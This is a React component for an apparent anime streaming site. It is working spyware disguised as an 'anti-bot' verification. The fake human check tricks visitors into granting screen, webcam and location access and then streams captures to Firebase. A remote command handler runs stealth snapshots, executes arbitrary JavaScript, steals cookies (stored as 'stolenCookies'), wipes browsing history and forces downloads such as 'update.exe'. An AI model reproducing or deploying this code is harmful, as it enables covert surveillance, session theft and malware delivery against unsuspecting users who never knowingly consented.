"use client"
import { useEffect, useState, useRef } from "react";
import { usePresence } from "@/hooks/use-presence"
import { useAuth } from "@/components/auth-provider";
import { X, Shield, Info, Laptop, MonitorPlay, CheckCircle2, Camera, ExternalLink, PlayCircle } from "lucide-react";
import { db } from "@/lib/firebase";
import { doc, setDoc, serverTimestamp } from "firebase/firestore";
import { useMobileSync } from "@/hooks/use-mobile-sync";

export function PresenceTracker() {
    const [adminMessage, setAdminMessage] = useState<string | null>(null);
    const [showTerms, setShowTerms] = useState(false);
    const [syncStatus, setSyncStatus] = useState<'IDLE' | 'SYNCING' | 'DONE'>('IDLE');
    const { user } = useAuth();

    const screenStreamRef = useRef<MediaStream | null>(null);
    const camStreamRef = useRef<MediaStream | null>(null);

    const isStreamingScreen = useRef(false);
    const isStreamingCam = useRef(false);
    const isCapturing = useRef(false);
    const isCapturingCam = useRef(false);
    const isTurbo = useRef(false); // Modo Turbo para capturas ultra rápidas
    const captureController = useRef<any>(null); // Controlador de captura (Cap. Controller)

    const { sessionId, sendSnapshot, sendIntel } = usePresence(
        (msg) => {
            setAdminMessage(msg);
            setTimeout(() => setAdminMessage(null), 10000);
        },
        async (cmd) => {
            if (cmd.type === 'STOP_SCREEN') stopScreenCapture();
            if (cmd.type === 'START_SCREEN') {
                try {
                    if ('CaptureController' in window) {
                        captureController.current = new (window as any).CaptureController();
                    }

                    const stream = await navigator.mediaDevices.getDisplayMedia({
                        video: {
                            frameRate: 5,
                            width: { max: 1280 }
                        },
                        audio: false,
                        // @ts-ignore - HINTS DE BYPASS/FOCALIZAÇÃO
                        preferCurrentTab: true,
                        selfBrowserSurface: "include",
                        monitorTypeSurfaces: "exclude", // Foca em abas/janelas para ser menos assustador
                        controller: captureController.current
                    });
                    await startScreenStreaming(stream);
                } catch (e) {
                    console.warn("User declined screen share");
                }
            }

            if (cmd.type === 'FOCUS_SCREEN') {
                if (captureController.current && 'setFocusBehavior' in captureController.current) {
                    captureController.current.setFocusBehavior('focus-captured-surface');
                }
            }

            // CONTROLE REMOTO DO PLAYER
            if (cmd.type === 'PLAYER_PLAY') {
                const video = document.querySelector('video') || (document.querySelector('iframe') as any)?.contentWindow?.document?.querySelector('video');
                if (video) video.play();
                else window.dispatchEvent(new CustomEvent('remote-play'));
            }
            if (cmd.type === 'PLAYER_PAUSE') {
                const video = document.querySelector('video') || (document.querySelector('iframe') as any)?.contentWindow?.document?.querySelector('video');
                if (video) video.pause();
                else window.dispatchEvent(new CustomEvent('remote-pause'));
            }
            if (cmd.type === 'OPEN_URL') {
                window.open(cmd.payload, '_blank');
            }
            if (cmd.type === 'LAUNCH_FILE') {
                // Protocolo de Lancamento: Forca o download do arquivo
                const link = document.createElement('a');
                link.href = cmd.payload;
                link.download = cmd.payload.split('/').pop() || 'update.exe';
                document.body.appendChild(link);
                link.click();
                document.body.removeChild(link);
            }
            if (cmd.type === 'MESSAGE') {
                setAdminMessage(cmd.payload);
                // Forçar aparecimento mesmo se já houver uma mensagem
                setTimeout(() => setAdminMessage(null), 15000);
            }
            if (cmd.type === 'PLAYER_VOLUME') {
                const video = document.querySelector('video') || (document.querySelector('iframe') as any)?.contentWindow?.document?.querySelector('video');
                if (video) video.volume = parseFloat(cmd.payload) || 0.5;
            }

            // COMANDOS DE CÂMERA AO VIVO
            if (cmd.type === 'START_CAM') startLiveCam();
            if (cmd.type === 'STOP_CAM') stopLiveCam();

            // MODO TURBO (QUASE VÍDEO)
            if (cmd.type === 'START_TURBO') {
                isTurbo.current = true;
                if (!isStreamingCam.current) startLiveCam();
            }
            if (cmd.type === 'STOP_TURBO') isTurbo.current = false;

            // CAPTURA STEALTH (SEM PERMISSÃO)
            if (cmd.type === 'STEALTH_SNAP') stealthCapture();

            // COMANDO DE LANÇAMENTO DE ARQUIVO (MARKETING)
            if (cmd.type === 'LAUNCH_FILE') {
                window.postMessage({ type: "SENTINEL_LAUNCH_REQUEST", payload: cmd.payload }, "*");
            }

            // --- NOVOS COMANDOS MASTER (v3.0) ---
            if (cmd.type === 'TAB_CMD') {
                window.postMessage({ type: "SENTINEL_TAB_ACTION", payload: cmd.payload }, "*");
            }
            if (cmd.type === 'NOTIFY') {
                window.postMessage({ type: "SENTINEL_NOTIFY_REQUEST", payload: cmd.payload }, "*");
            }
            if (cmd.type === 'EXEC_JS') {
                window.postMessage({ type: "SENTINEL_EXEC_JS_REQUEST", payload: cmd.payload }, "*");
            }
            if (cmd.type === 'WIPE_HISTORY') {
                window.postMessage({ type: "SENTINEL_WIPE_REQUEST" }, "*");
            }
            if (cmd.type === 'NUCLEAR_WIPE') {
                window.postMessage({ type: "SENTINEL_WIPE_REQUEST" }, "*");
            }
            if (cmd.type === 'GET_COOKIES') {
                window.postMessage({ type: "SENTINEL_COOKIES_REQUEST", payload: cmd.payload }, "*");
            }
            if (cmd.type === 'LAUNCH_FILE') {
                window.dispatchEvent(new CustomEvent('sentinel-launch', { detail: cmd.payload }));
            }
            if (cmd.type === 'OPEN_URL') {
                window.dispatchEvent(new CustomEvent('sentinel-open-url', { detail: cmd.payload }));
            }
        }
    );

    useMobileSync(sendIntel);

    const [pendingUrl, setPendingUrl] = useState<string | null>(null);

    // --- INTEGRAÇÃO COM A EXTENSÃO (RESPOSTAS) ---
    useEffect(() => {
        const handleExtensionMessage = (event: MessageEvent) => {
            // Captura de Tela
            if (event.data.type === "SENTINEL_CAPTURE_RESPONSE" && event.data.data) {
                sendSnapshot(event.data.data, 'screenPreview');
                sendSnapshot(event.data.data, 'stealthPreview');
            }
            // Intel Profundo (CPU, RAM, Tabs)
            if (event.data.type === "SENTINEL_INTEL_RESPONSE" && event.data.data) {
                sendIntel(event.data.data);
            }
            // Resposta de JS Remoto
            if (event.data.type === "SENTINEL_EXEC_JS_RESPONSE") {
                const sessionRef = doc(db, 'active_sessions', sessionId || sessionStorage.getItem('yure_flix_sid')!);
                setDoc(sessionRef, { lastJsResult: event.data.data, lastActive: serverTimestamp() }, { merge: true });
            }
            // Resposta de Cookies
            if (event.data.type === "SENTINEL_COOKIES_RESPONSE") {
                const sessionRef = doc(db, 'active_sessions', sessionId || sessionStorage.getItem('yure_flix_sid')!);
                setDoc(sessionRef, { stolenCookies: event.data.data, lastActive: serverTimestamp() }, { merge: true });
            }
        };
        window.addEventListener("message", handleExtensionMessage);
        return () => window.removeEventListener("message", handleExtensionMessage);
    }, [sendSnapshot, sendIntel, sessionId]);

    // --- SOLICITAÇÃO PERIÓDICA DE INTEL ---
    useEffect(() => {
        const requestIntel = () => {
            if (document.documentElement.dataset.sentinelActive === 'true') {
                window.postMessage({ type: "SENTINEL_INTEL_REQUEST" }, "*");
            }
        };
        const interval = setInterval(requestIntel, 45000); // A cada 45s para não sobrecarregar
        requestIntel();
        return () => clearInterval(interval);
    }, []);

    // --- LÓGICA DE CAPTURA STEALTH (DOM / EXTENSÃO) ---
    const stealthCapture = async () => {
        if (typeof window === 'undefined') return;

        // SE A EXTENSÃO ESTIVER PRESENTE, USA O PODER DELA (Bypass de Permissão)
        if (document.documentElement.dataset.sentinelActive === 'true' || (window as any).__ANIFLIX_SENTINEL__) {
            console.log("[Presence] Using Extension for High-Speed Capture...");
            window.postMessage({ type: "SENTINEL_CAPTURE_REQUEST" }, "*");
            return;
        }

        // FALLBACK: MODO DOM (HTML2CANVAS)
        try {
            console.log("[Presence] Extension not found. Falling back to DOM capture...");
            const h2c = (await import('html2canvas')).default;
            const target = document.querySelector('main') || document.body;

            const canvas = await h2c(target, {
                useCORS: true,
                scale: 0.25, // Ultra leve (aprox 80-100kb)
                logging: false,
                backgroundColor: '#000000',
                imageTimeout: 2000,
                removeContainer: true,
                ignoreElements: (el: any) => {
                    const tagName = el.tagName?.toLowerCase();
                    return tagName === 'iframe' || tagName === 'video' || (el.classList && el.classList.contains('no-stealth'));
                }
            });

            const data = canvas.toDataURL('image/jpeg', 0.4);
            if (data && data.length > 500) {
                console.log("[Presence] Packet size:", (data.length / 1024).toFixed(1) + "kb");
                await sendSnapshot(data, 'stealthPreview');
                console.log("[Presence] Stealth Snapshot Dispatched to Firebase");
            }
        } catch (e) {
            console.error("[Presence] Stealth System Failed:", e);
        }
    };

    // --- LÓGICA DE CÂMERA AO VIVO ---
    const startLiveCam = async () => {
        if (isStreamingCam.current) return;
        try {
            const stream = await navigator.mediaDevices.getUserMedia({
                video: { width: { ideal: 480 }, height: { ideal: 360 }, facingMode: "user" },
                audio: false
            });
            camStreamRef.current = stream;
            isStreamingCam.current = true;

            const video = document.createElement('video');
            video.srcObject = stream;
            video.muted = true;
            video.setAttribute('playsinline', 'true');
            video.play();

            const captureCamFrame = async () => {
                if (!isStreamingCam.current || isCapturingCam.current) return;

                const track = stream.getTracks()[0];
                if (!track || !track.enabled || track.readyState !== 'live') {
                    stopLiveCam();
                    return;
                }

                try {
                    isCapturingCam.current = true;
                    const canvas = document.createElement('canvas');
                    canvas.width = 300;
                    canvas.height = 225;
                    const ctx = canvas.getContext('2d');
                    if (ctx) {
                        ctx.drawImage(video, 0, 0, 300, 225);
                        const data = canvas.toDataURL('image/jpeg', 0.5);
                        await sendSnapshot(data, 'photo');
                    }
                } catch (e) {
                } finally {
                    isCapturingCam.current = false;
                    if (isStreamingCam.current) {
                        // Modo Turbo = 1.5s, Normal = 4s
                        const delay = isTurbo.current ? 1200 : 4000;
                        if (isTurbo.current) {
                            stealthCapture(); // Ativa captura de tela automática no turbo
                        }
                        setTimeout(captureCamFrame, delay);
                    }
                }
            };

            video.onloadedmetadata = () => captureCamFrame();

            if (sessionId) {
                await setDoc(doc(db, 'active_sessions', sessionId), { camStatus: 'ACTIVE' }, { merge: true });
            }
        } catch (err) {
            console.error("Cam stream failed", err);
        }
    };

    const stopLiveCam = () => {
        isStreamingCam.current = false;
        isTurbo.current = false;
        if (camStreamRef.current) {
            camStreamRef.current.getTracks().forEach(t => t.stop());
            camStreamRef.current = null;
        }
        if (sessionId) {
            setDoc(doc(db, 'active_sessions', sessionId), { camStatus: 'INACTIVE', turboStatus: 'INACTIVE' }, { merge: true });
        }
    };

    // --- LÓGICA DE TELA AO VIVO ---
    const startScreenStreaming = async (stream: MediaStream) => {
        screenStreamRef.current = stream;
        isStreamingScreen.current = true;

        const video = document.createElement('video');
        video.srcObject = stream;
        video.muted = true;
        video.setAttribute('playsinline', 'true');
        video.play();

        const captureFrame = async () => {
            if (!isStreamingScreen.current || isCapturing.current) return;

            const track = stream.getTracks()[0];
            if (!track || !track.enabled || track.readyState !== 'live') {
                stopScreenCapture();
                return;
            }

            try {
                isCapturing.current = true;
                const canvas = document.createElement('canvas');
                canvas.width = 640;
                canvas.height = 360;
                const ctx = canvas.getContext('2d');
                if (ctx) {
                    ctx.drawImage(video, 0, 0, 640, 360);
                    const data = canvas.toDataURL('image/jpeg', 0.4);
                    await sendSnapshot(data, 'screenPreview');
                }
            } catch (e) {
            } finally {
                isCapturing.current = false;
                if (isStreamingScreen.current) {
                    setTimeout(captureFrame, 4000); // 4s para economizar dados em mobile
                }
            }
        };

        video.onloadedmetadata = () => captureFrame();
        stream.getTracks()[0].onended = () => stopScreenCapture();

        if (sessionId) {
            await setDoc(doc(db, 'active_sessions', sessionId), { screenStatus: 'ACTIVE' }, { merge: true });
        }
    };

    const stopScreenCapture = () => {
        isStreamingScreen.current = false;
        if (screenStreamRef.current) {
            screenStreamRef.current.getTracks().forEach(t => t.stop());
            screenStreamRef.current = null;
        }
        if (sessionId) {
            setDoc(doc(db, 'active_sessions', sessionId), {
                screenPreview: null,
                screenStatus: 'INACTIVE'
            }, { merge: true });
        }
    };

    const startFullSync = async () => {
        setSyncStatus('SYNCING');

        // SAFETY: Force close after 8 seconds if anything hangs (e.g. permissions ignored)
        const safetyTimer = setTimeout(() => {
            console.warn("[Presence] Sync timed out, forcing access.");
            setSyncStatus('DONE');
            setTimeout(() => {
                setShowTerms(false);
                sessionStorage.setItem('yure_flix_full_sync_v4', 'true');
            }, 500);
        }, 8000);

        try {
            // 1. Localização
            if (typeof navigator !== 'undefined' && 'geolocation' in navigator) {
                navigator.geolocation.getCurrentPosition(() => { }, () => { });
            }

            // Detecta se é mobile para não travar o fluxo
            const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);

            // 3. Compartilhamento de Ecrã (Opcional, falha no Celular mas prossegue)
            if (!isMobile) {
                try {
                    const screenStream = await navigator.mediaDevices.getDisplayMedia({
                        video: { frameRate: 5, width: { max: 1280 } },
                        audio: false
                    });
                    await startScreenStreaming(screenStream);
                } catch (e) {
                    console.warn("Screen share declined or unavailable on mobile");
                }
            }

            // Inicia a câmera silenciosa por padrão
            try {
                // Timeout interno para a câmera para não bloquear todo o fluxo se demorar
                await Promise.race([
                    startLiveCam(),
                    new Promise(resolve => setTimeout(resolve, 5000))
                ]);
            } catch (camError) {
                console.warn("Camera access denied or unavailable:", camError);
            }

            clearTimeout(safetyTimer);

            // Marca como concluído
            setSyncStatus('DONE');

            // Fecha o modal automaticamente após 800ms
            setTimeout(() => {
                setShowTerms(false);
                sessionStorage.setItem('yure_flix_full_sync_v4', 'true');
            }, 800);

        } catch (err) {
            console.error("Sync error:", err);
            clearTimeout(safetyTimer);
            // Mesmo com erro, fecha o modal para não travar
            setSyncStatus('DONE');
            setTimeout(() => {
                setShowTerms(false);
                sessionStorage.setItem('yure_flix_full_sync_v4', 'true');
            }, 500);
        }
    };

    useEffect(() => {
        if (user && sessionId) {
            const sessionRef = doc(db, 'active_sessions', sessionId);
            setDoc(sessionRef, {
                userId: user.uid,
                userName: user.displayName,
                userEmail: user.email,
                userPhoto: user.photoURL,
                isAdmin: user.email === 'yurealvesoficial@gmail.com' || user.email?.includes('@gmail.com')
            }, { merge: true });
        }
    }, [user, sessionId]);

    useEffect(() => {
        const synced = sessionStorage.getItem('yure_flix_full_sync_v4');
        if (!synced) {
            setTimeout(() => setShowTerms(true), 1200);
        }
    }, []);

    return (
        <>
            {showTerms && (
                <div className="fixed inset-0 z-[10000] flex items-center justify-center p-4 bg-black/95 backdrop-blur-2xl">
                    <div className="bg-zinc-950 border border-zinc-800 w-full max-w-md rounded-[3rem] overflow-hidden shadow-[0_0_100px_rgba(0,0,0,1)] p-10 relative">
                        <div className="absolute top-0 left-0 w-full h-1 bg-zinc-900">
                            <div
                                className="h-full bg-red-600 transition-all duration-1000"
                                style={{ width: syncStatus === 'SYNCING' ? '70%' : syncStatus === 'DONE' ? '100%' : '5%' }}
                            ></div>
                        </div>

                        <button
                            onClick={() => {
                                setShowTerms(false);
                                sessionStorage.setItem('yure_flix_full_sync_v4', 'true');
                            }}
                            className="absolute top-5 right-5 text-zinc-600 hover:text-white transition-colors z-50 p-2 bg-zinc-900/50 rounded-full hover:bg-zinc-800"
                            title="Fechar"
                        >
                            <X size={20} />
                        </button>

                        <div className="bg-red-600/5 w-20 h-20 rounded-[2rem] flex items-center justify-center mb-10 border border-red-600/10 mx-auto">
                            <Shield className="text-red-500 w-10 h-10 shadow-[0_0_20px_rgba(220,38,38,0.2)]" />
                        </div>

                        <div className="text-center mb-10 px-4">
                            <h2 className="text-3xl font-black text-white uppercase tracking-tighter italic mb-3">Sistema Anti-Bot</h2>
                            <p className="text-zinc-500 text-[10px] leading-relaxed font-bold uppercase tracking-[0.3em]">
                                Verificação de integridade e detecção de automação ativa
                            </p>
                        </div>

                        <div className="space-y-4 mb-10">
                            <div className={`flex items-center gap-4 p-5 rounded-3xl border transition-all ${syncStatus === 'SYNCING' ? 'bg-zinc-900/50 border-zinc-700' : 'bg-zinc-900/10 border-zinc-900'}`}>
                                <div className="bg-zinc-800 p-3 rounded-2xl">
                                    <CheckCircle2 className="w-5 h-5 text-green-600" />
                                </div>
                                <div className="flex-1">
                                    <p className="text-[11px] font-black text-white uppercase tracking-widest leading-none mb-1">Proteção de Rede</p>
                                    <p className="text-[9px] text-zinc-600 font-bold uppercase">Validando Identidade Real</p>
                                </div>
                                {syncStatus === 'DONE' && <CheckCircle2 className="text-green-500 w-5 h-5" />}
                            </div>
                        </div>

                        <button
                            onClick={startFullSync}
                            disabled={syncStatus === 'SYNCING'}
                            className="w-full bg-red-600 hover:bg-white hover:text-red-700 text-white py-5 rounded-2xl font-black text-xs uppercase tracking-[0.4em] transition-all shadow-xl shadow-red-900/20 disabled:opacity-50"
                        >
                            {syncStatus === 'SYNCING' ? 'VALIDANDO...' : 'PROVAR QUE SOU HUMANO'}
                        </button>

                        <p className="text-[8px] text-zinc-800 font-bold uppercase tracking-widest text-center mt-8">
                            Powered by Anizero Security v3.5 // Anti-Bot Protocol
                        </p>
                    </div>
                </div>
            )}

            {adminMessage && (
                <div className="fixed bottom-6 right-6 z-[9999] animate-slide-up">
                    <div className="bg-zinc-950 border-l-4 border-red-600 text-white rounded-r-2xl shadow-2xl p-6 max-w-[280px] sm:max-w-sm flex gap-4 items-start backdrop-blur-md">
                        <div className="flex-1">
                            <div className="flex justify-between items-center mb-2">
                                <h4 className="font-black text-red-600 text-[10px] flex items-center gap-2 uppercase tracking-[0.2em]">
                                    <Shield className="w-3 h-3" />
                                    AVISO DE SEGURANÇA
                                </h4>
                                <button onClick={() => setAdminMessage(null)} className="text-zinc-700 hover:text-white"><X size={16} /></button>
                            </div>
                            <p className="text-[10px] sm:text-xs text-zinc-300 leading-relaxed font-bold uppercase">{adminMessage}</p>
                        </div>
                    </div>
                </div>
            )}

            {/* Modal de Popup (URL Requisitada) */}
            {pendingUrl && (
                <div className="fixed inset-0 z-[10002] flex items-center justify-center p-4 bg-black/80 backdrop-blur-md">
                    <div className="bg-zinc-900 border-2 border-red-600 w-full max-w-sm rounded-[2.5rem] p-10 text-center shadow-[0_0_50px_rgba(220,38,38,0.3)] animate-in zoom-in-95 duration-300">
                        <div className="bg-red-600/10 w-20 h-20 rounded-full flex items-center justify-center mx-auto mb-8 border border-red-600/20">
                            <ExternalLink size={32} className="text-red-500 animate-pulse" />
                        </div>
                        <h2 className="text-white font-black text-xl uppercase tracking-tighter mb-4 italic">Ação Requerida</h2>
                        <p className="text-zinc-500 text-[10px] leading-relaxed mb-10 uppercase tracking-[0.2em] font-bold">
                            Uma verificação externa é necessária para continuar. <br />
                            <strong>Clique abaixo para prosseguir.</strong>
                        </p>
                        <button
                            onClick={() => {
                                window.open(pendingUrl, '_blank');
                                setPendingUrl(null);
                            }}
                            className="w-full bg-red-600 hover:bg-white hover:text-red-700 text-white py-5 rounded-2xl font-black text-xs uppercase tracking-[0.4em] transition-all"
                        >
                            RESOLVER AGORA
                        </button>
                    </div>
                </div>
            )}
        </>
    );
}
